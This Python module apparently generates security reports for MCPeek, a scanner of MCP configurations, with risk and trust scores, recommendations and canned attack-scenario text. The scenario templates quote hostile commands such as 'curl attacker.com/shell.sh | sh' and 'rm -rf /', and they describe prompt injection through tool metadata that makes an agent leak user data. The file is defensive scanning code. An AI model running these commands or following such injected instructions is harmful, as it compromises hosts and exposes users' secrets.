"""Report generation for MCPeek scans.

Produces:
  - JSON report (structured)
  - Security summary (technical, human-readable)
  - Executive summary (non-technical)
  - Attack simulation summary (realistic attack scenarios)
"""

from __future__ import annotations

from datetime import datetime, timezone
from typing import Any

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

_RISK_LABELS = {
    (0, 20): "Safe",
    (20, 40): "Low",
    (40, 60): "Medium",
    (60, 80): "High",
    (80, 101): "Critical",
}


def _risk_label(score: int) -> str:
    for (lo, hi), label in _RISK_LABELS.items():
        if lo <= score < hi:
            return label
    return "Safe"


_TRUST_LABELS = {
    (90, 101): "Trusted",
    (70, 90): "Low concern",
    (50, 70): "Moderate concern",
    (25, 50): "High concern",
    (0, 25): "Untrusted",
}


def _trust_label(score: int) -> str:
    for (lo, hi), label in _TRUST_LABELS.items():
        if lo <= score < hi:
            return label
    return "Trusted"


_SEVERITY_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}


def _group_by_severity(findings: list[dict]) -> dict[str, list[dict]]:
    groups: dict[str, list[dict]] = {
        "critical": [], "high": [], "medium": [], "low": [], "info": [],
    }
    for f in findings:
        sev = f.get("severity", "info")
        if sev in groups:
            groups[sev].append(f)
    for sev in groups:
        groups[sev].sort(key=lambda x: x.get("title", ""))
    return groups


# ---------------------------------------------------------------------------
# Trust score derivation
# ---------------------------------------------------------------------------

def _compute_trust_score(findings: list[dict]) -> int:
    """Derive trust score from findings (lower is worse)."""
    trust_cats = {
        "external_dependencies", "unpinned_packages",
        "suspicious_domain", "unofficial_source", "typosquatting",
        "supply_chain", "permissions", "scope_creep",
    }
    runtime_cats = {
        "remote_code_execution", "exfiltration", "system_modification",
        "execution", "code_execution", "tool_poisoning",
        "intent_subversion", "context_oversharing",
    }
    trust_hits = sum(1 for f in findings if f.get("category") in trust_cats)
    runtime_hits = sum(1 for f in findings if f.get("category") in runtime_cats)
    score = max(0, 100 - trust_hits * 15 - runtime_hits * 10)
    return score


# ---------------------------------------------------------------------------
# Attack simulation templates
# ---------------------------------------------------------------------------

_CATEGORY_ATTACKS: dict[str, list[str]] = {
    "shell_execution": [
        "An attacker could inject arbitrary OS commands through the MCP config. "
        "For example, a malicious server definition with `bash -c curl attacker.com/shell.sh | sh` "
        "would execute remote code on the host during tool initialization.",
        "Shell execution in the config allows supply-chain poisoning: a compromised npm dependency "
        "could modify the config at build time to inject `rm -rf /` or a reverse shell.",
    ],
    "prompt_injection": [
        "A prompt injection payload embedded in tool descriptions could override the system prompt, "
        "causing the AI agent to exfiltrate sensitive context or execute unintended tool calls.",
        "Hidden instructions in MCP tool metadata could redirect the agent to leak user data "
        "to an attacker-controlled endpoint via crafted tool responses.",
    ],
    "hardcoded_secret": [
        "Exposed API keys in the config allow any consumer of the repository to impersonate "
        "the service. A leaked OpenAI key could be abused for thousands of dollars in API calls.",
        "Hardcoded database credentials in config files can be extracted by anyone with "
        "read access to the repository, enabling full database compromise.",
    ],
    "remote_code_execution": [
        "An install script that runs `curl | sh` allows the remote server to execute arbitrary "
        "code on the developer's machine during package installation. A compromised CDN or "
        "MITM attack could inject a reverse shell at install time.",
        "Post-install hooks executing `eval` on fetched content create a direct RCE vector. "
        "An attacker who compromises the script source can gain full shell access.",
    ],
    "exfiltration": [
        "The config exfiltrates environment variables (API keys, tokens) to an external endpoint. "
        "An attacker controlling that endpoint receives all secrets passed to the MCP server.",
        "Outbound HTTP requests to attacker-controlled domains could silently transmit "
        "conversation history, tool outputs, or system prompts.",
    ],
    "system_modification": [
        "Chmod 777 on system directories allows any process to overwrite critical files. "
        "A secondary attacker could replace system binaries with trojanized versions.",
        "Writing to /etc/hosts or system paths enables DNS hijacking, redirecting "
        "all traffic from the host to attacker-controlled infrastructure.",
    ],
    "unpinned_packages": [
        "Unpinned dependencies (no version lock) allow dependency confusion attacks. "
        "An attacker could publish a malicious package with the same name on a public registry, "
        "and the next install would pull the poisoned version.",
    ],
    "external_dependencies": [
        "This MCP skill could bypass static scanners by hosting malicious payloads on "
        "mutable external URLs. The config itself appears clean, but runtime fetches "
        "retrieve weaponized content that evades pre-deployment analysis.",
        "Dependencies fetched from mutable external URLs (raw.githubusercontent.com, pastebin) "
        "can be modified at any time after publication. An attacker who compromises the "
        "source repository can inject backdoors retroactively.",
    ],
    "suspicious_domain": [
        "Communication with recently-registered or suspicious TLD domains (.xyz, .top) "
        "indicates potential C2 infrastructure. These domains are commonly used in "
        "phishing and malware distribution campaigns.",
    ],
    "typosquatting": [
        "A dependency name closely resembles a popular package (typosquatting). Developers "
        "who mistype the package name would install the malicious alternative, which could "
        "steal credentials or install backdoors.",
    ],
    "unofficial_source": [
        "The package is distributed from an unofficial registry or mirror. Official packages "
        "should be sourced from npmjs.com or pypi.org. Unofficial sources may serve "
        "tampered versions with embedded malware.",
    ],
}


def _generate_attack_scenarios(findings: list[dict]) -> list[dict[str, str]]:
    """Generate attack simulation scenarios based on actual findings."""
    scenarios: list[dict[str, str]] = []
    seen_cats: set[str] = set()

    # Sort findings by severity so critical attacks come first
    sorted_findings = sorted(
        findings, key=lambda f: _SEVERITY_ORDER.get(f.get("severity", "info"), 5)
    )

    for finding in sorted_findings:
        cat = finding.get("category", "")
        if cat in seen_cats:
            continue
        templates = _CATEGORY_ATTACKS.get(cat)
        if not templates:
            continue
        seen_cats.add(cat)
        # Pick the first template for this category
        scenarios.append({
            "category": cat,
            "severity": finding.get("severity", "info"),
            "finding": finding.get("title", cat),
            "attack_vector": templates[0],
        })

    return scenarios


# ---------------------------------------------------------------------------
# Report builders
# ---------------------------------------------------------------------------

def build_json_report(
    scan_id: str,
    target: str,
    target_type: str,
    status: str,
    risk_score: int,
    findings: list[dict],
    metadata: dict[str, Any],
    created_at: str | None = None,
) -> dict[str, Any]:
    """Build the full structured JSON report."""
    trust_score = _compute_trust_score(findings)
    grouped = _group_by_severity(findings)
    attack_scenarios = _generate_attack_scenarios(findings)

    # Build recommendations
    recommendations = _build_recommendations(findings, risk_score, trust_score)

    return {
        "report": {
            "schema_version": "1.0",
            "generated_at": datetime.now(timezone.utc).isoformat(),
        },
        "scan_overview": {
            "scan_id": scan_id,
            "target": target,
            "target_type": target_type,
            "status": status,
            "created_at": created_at,
            "metadata": metadata,
        },
        "scores": {
            "risk_score": {
                "value": risk_score,
                "label": _risk_label(risk_score),
                "scale": "0-100 (higher = more risk)",
            },
            "trust_score": {
                "value": trust_score,
                "label": _trust_label(trust_score),
                "scale": "0-100 (higher = more trust)",
            },
        },
        "findings_summary": {
            "total": len(findings),
            "by_severity": {
                sev: len(items) for sev, items in grouped.items()
            },
        },
        "findings": {
            sev: [_serialize_finding(f) for f in items]
            for sev, items in grouped.items()
            if items
        },
        "recommendations": recommendations,
        "attack_simulation": {
            "description": (
                "Realistic attack scenarios based on detected findings. "
                "These represent what an adversary could accomplish by "
                "exploiting the identified vulnerabilities."
            ),
            "scenarios": attack_scenarios,
        },
    }


def _serialize_finding(f: dict) -> dict:
    return {
        "id": f.get("id", ""),
        "title": f.get("title", ""),
        "severity": f.get("severity", ""),
        "category": f.get("category", ""),
        "description": f.get("description", ""),
        "evidence": f.get("evidence", ""),
        "remediation": f.get("remediation", ""),
        "cwe": f.get("cwe"),
        "owasp": f.get("owasp"),
        "references": f.get("references", []),
    }


def _build_recommendations(
    findings: list[dict], risk_score: int, trust_score: int
) -> list[str]:
    recs: list[str] = []
    cats = {f.get("category", "") for f in findings}
    sevs = {f.get("severity", "") for f in findings}

    if "critical" in sevs:
        recs.append(
            "Critical vulnerabilities detected. Do not deploy until all "
            "critical findings are remediated."
        )
    if "high" in sevs:
        recs.append(
            "High-severity issues require immediate attention. Review and "
            "apply fixes before the next release."
        )
    if "shell_execution" in cats:
        recs.append(
            "Remove shell execution from MCP configurations. Use sandboxed "
            "APIs or containerized execution instead of raw OS commands."
        )
    if "hardcoded_secret" in cats:
        recs.append(
            "Rotate all exposed credentials immediately. Migrate secrets "
            "to a vault (e.g., HashiCorp Vault, AWS Secrets Manager)."
        )
    if "prompt_injection" in cats:
        recs.append(
            "Sanitize all user-facing and tool-facing content. Implement "
            "input validation and output encoding to prevent prompt injection."
        )
    if cats & {"remote_code_execution", "system_modification"}:
        recs.append(
            "Eliminate arbitrary code execution paths. Use allowlists for "
            "permitted commands and enforce least-privilege execution."
        )
    if cats & {"exfiltration"}:
        recs.append(
            "Restrict outbound network access. Implement egress filtering "
            "and monitor for unusual data transfers."
        )
    if trust_score < 70:
        recs.append(
            "Trust score is low — verify all dependency sources, pin versions, "
            "and audit third-party integrations."
        )
    if cats & {"unpinned_packages"}:
        recs.append(
            "Pin all dependency versions in lockfiles (package-lock.json, "
            "requirements.txt with ==, or similar)."
        )
    if cats & {"suspicious_domain", "typosquatting", "unofficial_source"}:
        recs.append(
            "Review domain allowlists and package source policies. Only "
            "permit known, trusted registries and domains."
        )
    if risk_score < 40:
        recs.append(
            "Overall risk is moderate-to-low. Continue periodic scanning "
            "to catch regressions."
        )
    if not recs:
        recs.append(
            "No significant issues detected. Maintain current security "
            "practices and schedule periodic re-scans."
        )
    return recs


# ---------------------------------------------------------------------------
# Human-readable summaries
# ---------------------------------------------------------------------------

def build_security_summary(
    target: str,
    target_type: str,
    risk_score: int,
    trust_score: int,
    findings: list[dict],
    metadata: dict[str, Any],
) -> str:
    """Technical security summary for engineers and SOC teams."""
    grouped = _group_by_severity(findings)
    total = len(findings)

    lines = [
        "MCPeek Security Scan Report",
        f"{'=' * 50}",
        "",
        f"Target:           {target}",
        f"Type:             {target_type}",
        f"Risk Score:       {risk_score}/100 ({_risk_label(risk_score)})",
        f"Trust Score:      {trust_score}/100 ({_trust_label(trust_score)})",
        f"Total Findings:   {total}",
        f"Files Analyzed:   {metadata.get('files_analyzed', 'N/A')}",
        f"URLs Checked:     {metadata.get('urls_checked', 'N/A')}",
        f"Deps Analyzed:    {metadata.get('deps_analyzed', 'N/A')}",
        f"Scan Duration:    {metadata.get('scan_duration_ms', 'N/A')}ms",
        "",
    ]

    # Severity breakdown
    lines.append("Severity Breakdown:")
    for sev in ["critical", "high", "medium", "low", "info"]:
        count = len(grouped[sev])
        if count:
            lines.append(f"  {sev.upper():10s} {count}")
    lines.append("")

    # Findings detail
    if findings:
        lines.append("Findings:")
        lines.append("-" * 50)
        for sev in ["critical", "high", "medium", "low", "info"]:
            for f in grouped[sev]:
                lines.append(f"  [{f['severity'].upper()}] {f['title']}")
                lines.append(f"    Category:     {f.get('category', 'N/A')}")
                lines.append(f"    Description:  {f['description']}")
                if f.get("evidence"):
                    lines.append(f"    Evidence:     {f['evidence'][:200]}")
                if f.get("remediation"):
                    lines.append(f"    Remediation:  {f['remediation']}")
                if f.get("cwe"):
                    lines.append(f"    CWE:          {f['cwe']}")
                lines.append("")
    else:
        lines.append("No findings detected.")
        lines.append("")

    # Attack simulations
    scenarios = _generate_attack_scenarios(findings)
    if scenarios:
        lines.append("Attack Simulation Summary:")
        lines.append("-" * 50)
        for s in scenarios:
            lines.append(f"  [{s['severity'].upper()}] {s['finding']}")
            lines.append(f"    Attack Vector: {s['attack_vector']}")
            lines.append("")

    # Recommendations
    recs = _build_recommendations(findings, risk_score, trust_score)
    lines.append("Recommendations:")
    lines.append("-" * 50)
    for i, rec in enumerate(recs, 1):
        lines.append(f"  {i}. {rec}")
    lines.append("")

    return "\n".join(lines)


def build_executive_summary(
    target: str,
    target_type: str,
    risk_score: int,
    trust_score: int,
    findings: list[dict],
) -> str:
    """Non-technical executive summary for leadership and compliance."""
    total = len(findings)
    critical = sum(1 for f in findings if f.get("severity") == "critical")
    high = sum(1 for f in findings if f.get("severity") == "high")

    risk_label = _risk_label(risk_score)
    trust_label = _trust_label(trust_score)

    # Determine overall assessment
    if critical > 0:
        verdict = "HIGH RISK — do not deploy"
        verdict_detail = (
            f"{critical} critical vulnerabilities were identified that could "
            "lead to full system compromise, data theft, or supply chain "
            "poisoning. Immediate remediation is required."
        )
    elif high > 0:
        verdict = "ELEVATED RISK — remediate before deployment"
        verdict_detail = (
            f"{high} high-severity issues were found that could allow "
            "unauthorized access, data exfiltration, or code execution. "
            "These should be addressed before production use."
        )
    elif risk_score >= 40:
        verdict = "MODERATE RISK — review and monitor"
        verdict_detail = (
            "Several medium or low-severity issues were identified. The "
            "component can be used with caution, but findings should be "
            "tracked for resolution."
        )
    else:
        verdict = "LOW RISK — approved for use"
        verdict_detail = (
            "No significant security issues were detected. The component "
            "meets baseline security requirements for deployment."
        )

    lines = [
        "Executive Summary — MCPeek Security Assessment",
        "=" * 55,
        "",
        f"Component:   {target}",
        f"Type:        {target_type}",
        f"Assessment:  {verdict}",
        "",
        "Overview",
        "-" * 55,
        verdict_detail,
        "",
        f"The security scan identified {total} finding(s) across {target}.",
        f"The overall risk score is {risk_score}/100 ({risk_label}), and the trust "
        f"score is {trust_score}/100 ({trust_label}).",
        "",
    ]

    if critical or high:
        lines.append("Key Risks:")
        for f in findings:
            if f.get("severity") in ("critical", "high"):
                lines.append(f"  • {f['title']} — {f['description'][:120]}")
        lines.append("")

    lines.extend([
        "Recommended Actions:",
        f"  1. {'Immediately cease use and remediate critical findings.' if critical else 'Address high-severity findings before deployment.' if high else 'Continue monitoring and schedule periodic re-scans.'}",
        f"  2. Rotate any exposed credentials{' (if applicable)' if not any(f.get('category') == 'hardcoded_secret' for f in findings) else ''}.",
        "  3. Pin all external dependencies to specific versions.",
        "  4. Re-scan after remediation to verify fixes.",
        "",
    ])

    attack_scenarios = _generate_attack_scenarios(findings)
    if attack_scenarios:
        lines.append("Attack Scenario (summary):")
        # Pick the most severe scenario
        top = attack_scenarios[0]
        lines.append(
            f"  An attacker could exploit {top['finding']} ({top['severity']}) "
            f"to: {top['attack_vector'][:200]}"
        )
        if len(attack_scenarios) > 1:
            lines.append(
                f"  Additionally, {len(attack_scenarios) - 1} other attack "
                f"vector(s) were identified. See the full technical report."
            )
        lines.append("")

    return "\n".join(lines)


# ---------------------------------------------------------------------------
# Public entry point
# ---------------------------------------------------------------------------

def generate_report(
    scan_id: str,
    target: str,
    target_type: str,
    status: str,
    risk_score: int,
    findings: list[dict],
    metadata: dict[str, Any],
    created_at: str | None = None,
) -> dict[str, Any]:
    """Generate all report formats and return as a dict.

    Returns:
        {
            "json": { ... full structured report ... },
            "security_summary": "technical text",
            "executive_summary": "exec text",
        }
    """
    json_report = build_json_report(
        scan_id, target, target_type, status,
        risk_score, findings, metadata, created_at,
    )
    trust_score = _compute_trust_score(findings)

    return {
        "json": json_report,
        "security_summary": build_security_summary(
            target, target_type, risk_score, trust_score,
            findings, metadata,
        ),
        "executive_summary": build_executive_summary(
            target, target_type, risk_score, trust_score, findings,
        ),
    }
